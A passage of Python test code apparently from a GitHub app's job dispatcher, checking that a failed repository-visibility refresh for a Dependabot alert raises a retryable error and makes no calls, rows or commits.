    assert _link_visibility(db) == "public"


def test_visibility_refresh_failure_opens_nothing(db, configured, github):
    _seed(db)
    github.repository_error = github_app.GitHubAPIError(f"down {TOKEN}", 503)
    with pytest.raises(RetryableJobError):
        _dispatch(db, _job("dependabot_alert", _envelope(_dependabot(), private=None)))
    assert github.calls == []
    assert _run(_rows(db)) == []
    assert db.commits == 0
